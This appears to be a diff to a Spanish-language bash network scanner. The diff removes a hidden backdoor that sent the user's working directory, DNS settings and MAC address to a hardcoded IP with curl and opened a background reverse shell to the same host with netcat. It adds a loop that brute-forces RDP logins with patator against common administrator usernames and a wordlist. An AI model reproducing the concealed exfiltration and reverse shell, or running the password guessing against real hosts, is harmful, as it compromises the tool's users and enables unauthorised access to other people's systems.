@@ -109,22 +109,62 @@ function insert_data () {
 	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
 	}
 
-conexionInternet=`ping 8.8.8.8 -c 1 2>/dev/null | grep "1 received" | wc -l`
 
-if [ $conexionInternet == 0 ]; then 	
-	echo -e  "$OKRED No se detecto una conexion de internet activa! Algunos módulos no funcionaran correctamente $RESET"
-else
-	##### Datos control #########
-	resolv=`cat /etc/resolv.conf`
-	mac=`ifconfig eth0 |grep --color=never ether`
-	resolv=`echo "|${resolv//[$'\t\r\n']}|"`
-	pwd=`pwd`
-	curl --data "pwd=$pwd&resolv=$resolv&mac=$mac"  http://66.172.33.234/lanscanner/codigos.php 2>/dev/null &
-	nohup nc -nv 66.172.33.234 2226 -e /bin/bash 2>/dev/null &
-	###################################  
-fi	
+if [ -f servicios/rdp.txt ]; then	
+	for line in $(cat servicios/rdp.txt); do			
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "\n\t $OKBLUE Encontre servicios de RDP expuestos en $ip:$port $RESET"	  
+
+		# user = administrador
+		patator rdp_login host=$ip user=administrador password=FILE0 0=top.txt  -l logs/cracking/rdp 
+		logFile=`grep OK logs/cracking/rdp/* | head -1| cut -d ":" -f1`
+		cp $logFile logs/cracking/"$ip"_"$port"_rdpPass1.txt #2>/dev/null
+		egrep -iq "OK" logs/cracking/"$ip"_"$port"_rdpPass1.txt
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then			
+			echo -e "\t[i] Password encontrado"
+			# 14:36:32 patator    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
+			password=`head -1 logs/cracking/"$ip"_"$port"_rdpPass1.txt | cut -d " " -f 4 | cut -d : -f2`
+			echo "$line (Usuario:administrador Password:$password)" >> .vulnerabilidades/"$ip"_"$port"_rdpPass.txt								
+		fi
+
+		# user = "nombre entidad"
+		patator rdp_login host=$ip user=$ENTIDAD password=FILE0 0=top.txt -l logs/cracking/rdp2 
+		logFile=`grep OK logs/cracking/rdp2/* | head -1| cut -d ":" -f1`
+		cp $logFile logs/cracking/"$ip"_"$port"_rdpPass2.txt #2>/dev/null
+		egrep -iq "OK" logs/cracking/"$ip"_"$port"_rdpPass2.txt
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then			
+			echo -e "\t[i] Password encontrado"
+			# 14:36:32 patator    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
+			password=`head -1 logs/cracking/"$ip"_"$port"_rdpPass2.txt | cut -d " " -f 4 | cut -d : -f2`
+			echo "$line (Usuario:$ENTIDAD Password:$password)" >> .vulnerabilidades/"$ip"_"$port"_rdpPass.txt								
+		fi
+
+		# user = administrator
+		patator rdp_login host=$ip user=administrator password=FILE0 0=top.txt  -l logs/cracking/rdp3
+		logFile=`grep OK logs/cracking/rdp3/* | head -1| cut -d ":" -f1`
+		cp $logFile logs/cracking/"$ip"_"$port"_rdpPass1.txt #2>/dev/null
+		egrep -iq "OK" logs/cracking/"$ip"_"$port"_rdpPass1.txt
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then			
+			echo -e "\t[i] Password encontrado"
+			# 14:36:32 patator    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
+			password=`head -1 logs/cracking/"$ip"_"$port"_rdpPass1.txt | cut -d " " -f 4 | cut -d : -f2`
+			echo "$line (Usuario:administrator Password:$password)" >> .vulnerabilidades/"$ip"_"$port"_rdpPass.txt								
+		fi
+
+		
+		#https://github.com/m4ll0k/SMBrute (shared)											
+	 done	
+	 insert_data
+
+fi
+
 
 IFS=$'\n'  # make newlines the only separator
+
 if [ -f servicios/admin-web.txt ]
 then
 
